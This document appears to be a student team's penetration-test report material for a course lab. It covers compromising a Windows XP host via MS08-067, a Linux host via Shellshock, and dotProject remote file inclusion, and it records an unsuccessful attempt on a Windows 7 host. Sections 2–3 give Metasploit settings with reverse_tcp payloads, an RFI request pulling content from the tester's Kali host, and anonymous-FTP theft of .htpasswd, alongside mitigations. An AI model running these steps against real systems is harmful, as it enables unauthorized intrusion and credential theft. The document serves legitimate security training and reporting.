# Final Report — merge blocks for `10.20.160.100` / `.101` / `.102` (Team 6)

Paste these blocks into the team **Final Report** (Google Doc / Word / LaTeX) in the sections indicated. Renumber **Finding IDs** and **Figure** references so they follow the document’s global sequence; the **AR-** figure IDs below are placeholders for merge.

**Evidence lives in-repo:** `A_Rocha/work/10.20.160.<host>/Screenshots/`. **Technical Details** summary rows and hashes already match the team table (`proof` **18b2f4650dafe0ee6dfbe1b07f6e543e** on `.100`; `local.txt` **13d948e7023f2cb3f79b8852bf692bc8** on `.102`; `.101` flags **N/A**).

**Deeper command narrative:** [`success_paths_writeup.md`](success_paths_writeup.md) · per-host [`10.20.160.100/README.md`](10.20.160.100/README.md), [`10.20.160.101/README.md`](10.20.160.101/README.md), [`10.20.160.102/README.md`](10.20.160.102/README.md).

---

## 1) Executive Summary (plain English, ~½ page)

Use these bullets under **Executive Summary** (adjust tone to match the rest of the team draft):

- **Internal Windows XP host (`10.20.160.100`, ADRASTEA):** Assessors gained full control of the system through a well-known, unpatched file-sharing weakness. No stolen passwords were required. A lab **proof** file on a user desktop was retrieved, showing complete compromise of that machine.

- **Internal Linux web host (`10.20.160.102`, ELARA):** Assessors gained an interactive session through a legacy web server configuration (**CGI** combined with a widely known **2014** bash issue). A lab **user flag** file was read from the compromised account’s desktop. A separate **web application file-inclusion** issue was also demonstrated as a second way to pull remote content into the server.

- **Internal Windows 7 host (`10.20.160.101`, CALLISTO):** This system was **not** fully taken over. Assessors did confirm **anonymous file transfer** access and recovered **web login helper files** (including a password hash file) from an exposed folder. Attempts to use the same **SMB** exploit family used elsewhere in the lab did **not** yield a shell on this host.

---

## 2) Detailed Findings (paste into “Detailed Findings” / severity tables)

Renumber **F-xxx** to the team’s next free IDs. Place **Critical** items with other Critical findings (`.100`, `.102`); place **`.101`** as **High** or **Medium** per instructor rubric.

### Finding **[renumber — Critical]:** MS08-067 — Windows SMB Server Remote Code Execution (CVE-2008-4250)

**Description:** The target runs **Windows XP** with **SMB** exposed. The **MS08-067** vulnerability in the **Server service** allows unauthenticated remote code execution. Compromise was achieved with Metasploit **`exploit/windows/smb/ms08_067_netapi`**, yielding **Meterpreter** as **`NT AUTHORITY\SYSTEM`**.

**Severity:** Critical  

**Affected Hosts:** `10.20.160.100` (NetBIOS **ADRASTEA**, workgroup **JUPITER**)

**Impact:** Full operating system control without credentials; access to local files (including **`proof.txt`**), password hashes, and lateral movement preparation (e.g. connectivity to other lab hosts).

**Recommended Mitigation:** Remove **Windows XP** from production networks; if a legacy image must exist in a lab, isolate it and disable unnecessary **SMB** exposure. Apply vendor patches where still applicable (XP is end-of-life; upgrade path is the real fix).

**Evidence:** **Figure AR-3** (session opened); **Figure AR-4** (**`sysinfo` / `getuid`** **SYSTEM**); **Figure AR-5**–**AR-6** (**`proof.txt`** path and contents); **Figure AR-7** (full chain snapshot). See **Figure index** below.

---

### Finding **[renumber — Critical]:** GNU Bash environment injection / “Shellshock” (CVE-2014-6271 class) plus dotProject 2.1.6 remote file inclusion (EDB-22708)

**Description:** **`10.20.160.102`** runs **Apache** with **CGI** enabled. Metasploit **`exploit/multi/http/apache_mod_cgi_bash_env_exec`** against **`/cgi-bin/test-cgi`** delivered **Meterpreter** on the Linux host (**CentOS 6.3** in session **`sysinfo`**). Separately, **dotProject 2.1.6** **`gantt.php`** with **`dPconfig[root_dir]=`** was validated as a **remote file inclusion** primitive per **EDB-22708**.

**Severity:** Critical  

**Affected Hosts:** `10.20.160.102` (hostname **ELARA** in **`sysinfo`**)

**Impact:** Unauthenticated or low-bar remote code execution path via web/CGI; ability to read **`local.txt`** from the compromised user context. RFI supports data theft and chained attacks against the PHP stack.

**Recommended Mitigation:** Patch **bash** and disable unsafe **CGI** on internet-facing **Apache**; upgrade **dotProject** and PHP; enforce least privilege for the web user; remove **`test-cgi`**-style diagnostic scripts from production images.

**Evidence:** **Figure AR-11**–**AR-14** (Shellshock module **`run`**, **`sysinfo` / `getuid` / `shell`**, **`local.txt`**); **Figure AR-8**–**AR-10** (RFI / **searchsploit** advisory support). See **Figure index** below.

---

### Finding **[renumber — High or Medium]:** Anonymous FTP, sensitive artifact exposure, and legacy Windows / web stack (`10.20.160.101`)

**Description:** **FTP** on port **21** allows **anonymous** login (**`anonymous`** / email-form password). The **`forbidden`** directory exposed **`.htaccess`**, **`.htpasswd`**, and related files retrievable via **FTP**. **HTTP** **`/forbidden/`** prompts for **Basic Authentication** using recovered material; further browsing hits **XAMPP** “local network only” **403** behavior. **SMB** anonymous enumeration and **MS17-010** exploitation attempts did **not** achieve code execution (patched / negative **`check`** / **`STATUS_TRUSTED_RELATIONSHIP_FAILURE`** on forced exploit).

**Severity:** High or Medium (per course rubric — no full compromise)

**Affected Hosts:** `10.20.160.101` (NetBIOS **CALLISTO**, **Windows 7 Ultimate SP1** from enumeration tools)

**Impact:** Unauthenticated read access to sensitive configuration and credential material; increased risk of password guessing and follow-on web attacks. **RDP** and broad **RPC** surface remain exposed for credentialed or brute-force lanes.

**Recommended Mitigation:** Disable **anonymous FTP**; move secrets out of **FTP**-reachable paths; patch **Windows 7** or replace host; tighten **XAMPP** access controls; enable **SMB signing** and disable **SMBv1** where policy allows.

**Evidence:** **Figure AR-15**–**AR-23** (FTP login, **`get`** **`.htaccess`**, local review of **`.htpasswd`**, browser **Basic Auth**, **XAMPP 403**, **nmap**/SMB recon, EternalBlue negative / no session / trust failure). See **Figure index** below.

---

## 3) Technical Overview (3.1–3.5 per host)

Replace empty **“Windows SMB Attack Paths / Host:”** placeholders (or add subsections after the team’s SMB template) with the following three hosts.

### Host: `10.20.160.100` (ADRASTEA — Windows XP)

**3.1 Initial access**  
Target identified from scope sheet and **Nessus** / host profile (**EOL Windows XP**, **SMB**). Entry point: **SMB TCP 445** — **`exploit/windows/smb/ms08_067_netapi`** after fingerprint matched **XP** (not **EternalBlue**, which targets **Windows 7 / 2008 R2** pool layouts).

**3.2 Exploitation steps**  
**Metasploit:** `use exploit/windows/smb/ms08_067_netapi` → **`set RHOSTS 10.20.160.100`**, **`LHOST`** lab Kali on reachable interface, **`PAYLOAD windows/meterpreter/reverse_tcp`** → **`check`** / **`run`**. Confirmed **Meterpreter** session (**Figure AR-3**). **`sysinfo`** / **`getuid`** show **XP SP3**, **SYSTEM** (**Figure AR-4**). **`search -f proof.txt`** located **`Barbara\Desktop\proof.txt`** (**Figure AR-5**). **`shell`** then **`type`** with quoted path displayed file contents (**Figure AR-6**); consolidated chain in **Figure AR-7**.

**3.3 Privilege escalation**  
Not required — initial access was **SYSTEM**.

**3.4 Lateral movement**  
From **`meterpreter > shell`**, **`ping 10.20.160.101`** and **`10.20.160.102`** confirmed **ICMP** reachability for later pivot planning (optional evidence: **`100-009_shell_ping_101_102_ttl_tm6_afrocha.png`** in host **`Screenshots/`** — add as a figure if the team wants L3 proof in the PDF).

**3.5 Proof of compromise**  
**`proof.txt`** on **`C:\Documents and Settings\Barbara\Desktop\proof.txt`**. Hash in **Technical Details** table: **18b2f4650dafe0ee6dfbe1b07f6e543e** (do not paste raw flag string in report body if rubric forbids).

---

### Host: `10.20.160.101` (CALLISTO — Windows 7)

**3.1 Initial access**  
Target from scope; **`nmap --top-ports 1000`** showed **FTP**, **HTTP/S**, **SMB**, **RDP**, **MySQL**, dynamic **RPC** ports (**Figure AR-16** / **`101-001`** family). Entry for this narrative: **anonymous FTP**, not SMB shell.

**3.2 Exploitation steps**  
**`ftp 10.20.160.101`** — user **`anonymous`**, password **`test@`** → **`230 Logged on`** (**Figure AR-15** / **`101-011`**). **`cd forbidden`**, **`get .htaccess`**, **`get .htpasswd`** (**Figure AR-17** / **`101-013`**). Local review of looted **`.htpasswd`** (**Figure AR-18** / **`101-012`**). Browser: **HTTP Basic** for **`/forbidden/`** (**Figure AR-19** / **`101-014`**); post-auth **XAMPP** **403** “local network only” (**Figure AR-20** / **`101-015`**). **EternalBlue** **`check`** not vulnerable / **`ForceExploit`** no session (**Figure AR-21**–**AR-22** / **`101-008`**, **`101-010`**); **`STATUS_TRUSTED_RELATIONSHIP_FAILURE`** on **`run`** (**Figure AR-23** / **`101-017`**).

**3.3 Privilege escalation**  
None achieved.

**3.4 Lateral movement**  
None documented from this host.

**3.5 Proof of compromise**  
No **`local.txt`** / **`proof.txt`** on **`.101`** in this engagement — **Technical Details** row remains **N/A**.

---

### Host: `10.20.160.102` (ELARA — Linux / dotProject)

**3.1 Initial access**  
Web target: **`nmap`** and **`curl`** showed **Apache** / **PHP** and **`/dotproject/`** (**recon** screenshots under **`10.20.160.102/Screenshots/`**). Two lanes: **RFI** (**EDB-22708**) and **Shellshock** via **`mod_cgi`**.

**3.2 Exploitation steps**  
**RFI:** **`searchsploit dotproject 2.1.6`** → **`php/webapps/22708.txt`** (**Figure AR-8**–**AR-10** / **`102-007`**, **`102-008`**). **`curl`** against **`gantt.php?dPconfig[root_dir]=http://<KALI>:8080/...`** reflected proof marker (**Figure AR-8** / **`102-004`**).  

**Shellshock:** **`use exploit/multi/http/apache_mod_cgi_bash_env_exec`**, **`set RHOSTS 10.20.160.102`**, **`set RPORT 80`**, **`set targeturi /cgi-bin/test-cgi`**, **`set payload linux/x86/meterpreter/reverse_tcp`**, **`run`** (**Figure AR-11** / **`102-011`**). Session **`sysinfo` / `getuid` / `shell`** (**Figure AR-12**–**AR-13** / **`102-012`**, **`102-009`**).

**3.3 Privilege escalation**  
None required for **`local.txt`** objective; foothold was unprivileged **`no-user`** context per **`getuid`** — note for report if rubric asks for **priv-esc** gap.

**3.4 Lateral movement**  
None required for assigned flags.

**3.5 Proof of compromise**  
**`local.txt`** read from **`~/Desktop`** via **`meterpreter > shell`** (**Figure AR-14** / **`102-010`**). Hash in **Technical Details** table: **13d948e7023f2cb3f79b8852bf692bc8**.

---

## 4) Figure index and Table of Contents lines

When merging into the master document, **insert one row per figure** in the report’s **List of Figures** / TOC and **renumber globally** (the **AR-** IDs are only a stable merge key).

| Merge key | Suggested caption (edit after global renumber) | Repository file (embed in PDF / Doc) |
|-----------|--------------------------------------------------|----------------------------------------|
| **AR-1** | `10.20.160.100` — `enum4linux` null session denied (context) | `A_Rocha/work/10.20.160.100/Screenshots/100-001_enum4linux_null_session_denied_no_nbtstat_tm6_afrocha.png` |
| **AR-2** | `10.20.160.100` — MS17-010 `check` RPC timeout note (optional) | `A_Rocha/work/10.20.160.100/Screenshots/100-002_msf_ms17_010_check_135_timeout_still_vulnerable_tm6_afrocha.png` |
| **AR-3** | `10.20.160.100` — **`ms08_067_netapi`** Meterpreter session opened | `A_Rocha/work/10.20.160.100/Screenshots/100-003_msf_ms08_067_netapi_meterpreter_session_tm6_afrocha.png` |
| **AR-4** | `10.20.160.100` — **`sysinfo`** / **`getuid`** **SYSTEM** | `A_Rocha/work/10.20.160.100/Screenshots/100-004_meterpreter_sysinfo_system_shell_echo_tm6_afrocha.png` |
| **AR-5** | `10.20.160.100` — **`search -f proof.txt`** result | `A_Rocha/work/10.20.160.100/Screenshots/100-005_meterpreter_search_proof_txt_barbara_desktop_tm6_afrocha.png` |
| **AR-6** | `10.20.160.100` — **`shell`** + **`type`** **`proof.txt`** | `A_Rocha/work/10.20.160.100/Screenshots/100-006_meterpreter_type_unknown_shell_cmd_proof_tm6_afrocha.png` |
| **AR-7** | `10.20.160.100` — Full chain snapshot session 4 | `A_Rocha/work/10.20.160.100/Screenshots/100-008_msf_ms08_067_session4_sysinfo_shell_proof_txt_tm6_afrocha.png` |
| **AR-8** | `10.20.160.102` — RFI proof body / marker | `A_Rocha/work/10.20.160.102/Screenshots/102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png` |
| **AR-9** | `10.20.160.102` — **`searchsploit`** EDB-22708 listing | `A_Rocha/work/10.20.160.102/Screenshots/102-007_searchsploit_dotproject_2_1_6_edb22708_tm6_afrocha.png` |
| **AR-10** | `10.20.160.102` — Advisory text **`searchsploit -x`** | `A_Rocha/work/10.20.160.102/Screenshots/102-008_searchsploit_x_22708_rfi_gantt_advisory_tm6_afrocha.png` |
| **AR-11** | `10.20.160.102` — Shellshock module options + **`run`** | `A_Rocha/work/10.20.160.102/Screenshots/102-011_msf_search_apache_mod_cgi_bash_env_set_targeturi_test_cgi_run_tm6_afrocha.png` |
| **AR-12** | `10.20.160.102` — Meterpreter **`sysinfo` / `getuid` / `shell`** | `A_Rocha/work/10.20.160.102/Screenshots/102-012_msf_shellshock_meterpreter_session5_sysinfo_getuid_shell_afrocha_tm6_afrocha.png` |
| **AR-13** | `10.20.160.102` — Alternate Shellshock session capture | `A_Rocha/work/10.20.160.102/Screenshots/102-009_msf_shellshock_apache_mod_cgi_meterpreter_sysinfo_shell_elara_tm6_afrocha.png` |
| **AR-14** | `10.20.160.102` — **`cat ~/Desktop/local.txt`** | `A_Rocha/work/10.20.160.102/Screenshots/102-010_shell_meterpreter_home_desktop_cat_local_txt_afrocha_tm6_afrocha.png` |
| **AR-15** | `10.20.160.101` — Anonymous FTP **`230 Logged on`** | `A_Rocha/work/10.20.160.101/Screenshots/101-011_ftp_anonymous_230_logged_on_tm6_afrocha.png` |
| **AR-16** | `10.20.160.101` — **`nmap` / `smbclient` / CME** recon | `A_Rocha/work/10.20.160.101/Screenshots/101-001_nmap_smbclient_cme_tm6_afrocha.png` |
| **AR-17** | `10.20.160.101` — FTP **`get .htaccess`** **`forbidden`** | `A_Rocha/work/10.20.160.101/Screenshots/101-013_ftp_forbidden_get_htaccess_tm6_afrocha.png` |
| **AR-18** | `10.20.160.101` — **`cat`** looted **`.htpasswd`** | `A_Rocha/work/10.20.160.101/Screenshots/101-012_loot_cat_htpasswd_tm6_afrocha.png` |
| **AR-19** | `10.20.160.101` — HTTP Basic **`/forbidden/`** | `A_Rocha/work/10.20.160.101/Screenshots/101-014_http_basic_auth_forbidden_prompt_tm6_afrocha.png` |
| **AR-20** | `10.20.160.101` — XAMPP **403** local network | `A_Rocha/work/10.20.160.101/Screenshots/101-015_http_403_xampp_local_network_httpd_xampp_conf_tm6_afrocha.png` |
| **AR-21** | `10.20.160.101` — EternalBlue **`check`** not vulnerable | `A_Rocha/work/10.20.160.101/Screenshots/101-008_msf_eternalblue_check_not_vulnerable_tm6_afrocha.png` |
| **AR-22** | `10.20.160.101` — EternalBlue **`ForceExploit`** no session | `A_Rocha/work/10.20.160.101/Screenshots/101-010_msf_eternalblue_forceexploit_trans2_no_session_tm6_afrocha.png` |
| **AR-23** | `10.20.160.101` — **`STATUS_TRUSTED_RELATIONSHIP_FAILURE`** | `A_Rocha/work/10.20.160.101/Screenshots/101-017_msf_eternalblue_status_trusted_relationship_failure_tm6_afrocha.png` |

**TOC lines (Word / Google Docs)** — add under **List of Figures** (renumber **X** to final figure numbers):

```text
Figure X — 10.20.160.100 — MS08-067 Meterpreter session (evidence AR-3)
Figure X — 10.20.160.100 — SYSTEM context sysinfo/getuid (evidence AR-4)
Figure X — 10.20.160.100 — proof.txt discovery and read (evidence AR-5–AR-7)
Figure X — 10.20.160.102 — dotProject RFI / EDB-22708 (evidence AR-8–AR-10)
Figure X — 10.20.160.102 — Shellshock mod_cgi exploit run (evidence AR-11–AR-13)
Figure X — 10.20.160.102 — local.txt (evidence AR-14)
Figure X — 10.20.160.101 — Anonymous FTP and forbidden artifacts (evidence AR-15–AR-18)
Figure X — 10.20.160.101 — Web auth / XAMPP 403 (evidence AR-19–AR-20)
Figure X — 10.20.160.101 — EternalBlue negative / trust error (evidence AR-21–AR-23)
```

---

## 5) Optional: Technical Details row reminder (already in team draft)

Keep the existing table rows aligned with this narrative:

| Target | Open ports (from engagement) | Vulnerability / exploit (short) | Flag hash |
|--------|------------------------------|-----------------------------------|-------------|
| `10.20.160.100` | 139; 445 | MS08-067 NetAPI RCE — `exploit/windows/smb/ms08_067_netapi` | Proof **18b2f4650dafe0ee6dfbe1b07f6e543e** |
| `10.20.160.101` | 21, 80, 135, 139, 443, 445, 3306, 3389, 49152–49155 | Anonymous FTP; no shell | **N/A** |
| `10.20.160.102` | 80; 443; 8080 | dotProject RFI (EDB-22708) and Shellshock — `exploit/multi/http/apache_mod_cgi_bash_env_exec` | **local.txt** **13d948e7023f2cb3f79b8852bf692bc8** |

---

*Operator stamp on evidence files: **TM6_afrocha**.*
